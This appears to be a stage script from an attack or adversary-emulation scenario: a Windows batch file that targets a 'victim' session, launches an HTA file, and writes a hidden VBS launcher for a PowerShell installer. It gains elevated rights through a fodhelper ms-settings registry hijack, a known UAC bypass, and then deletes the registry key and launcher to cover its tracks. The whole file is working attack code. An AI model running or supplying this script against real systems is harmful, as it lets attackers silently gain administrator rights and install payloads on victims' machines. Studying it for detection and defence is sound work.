@echo off
setlocal
REM S1/S2 - entry + UAC bypass (fodhelper + ms-settings registry hijack).
REM Run from an interactive session of the victim account (local admin, filtered
REM token). Operates in the folder that also contains install.ps1.
set "S=%~dp0"
set "VBS=%TEMP%\r.vbs"
set "KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command"

echo [S1] entry: victim session launches %~nx0

if exist "%S%setup.hta" start "" mshta.exe "%S%setup.hta" 2>nul

echo [S2] write script-host proxy: %VBS%
echo Set o=CreateObject("WScript.Shell") > "%VBS%"
echo o.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%S%install.ps1""",0,False >> "%VBS%"

echo [S2] write ms-settings Open\command hijack
reg delete "%KEY%" /f >nul 2>&1
reg add "%KEY%" /ve /t REG_SZ /d "wscript.exe \"%VBS%\"" /f >nul 2>&1
reg add "%KEY%" /v "DelegateExecute" /t REG_SZ /d "" /f >nul 2>&1

echo [S2] trigger fodhelper
start /b fodhelper.exe

timeout /t 3 /nobreak >nul

echo [S2] remove transient key and proxy artifact
reg delete "%KEY%" /f >nul 2>&1
del /F /Q "%VBS%" >nul 2>&1

endlocal
exit /b %ERRORLEVEL%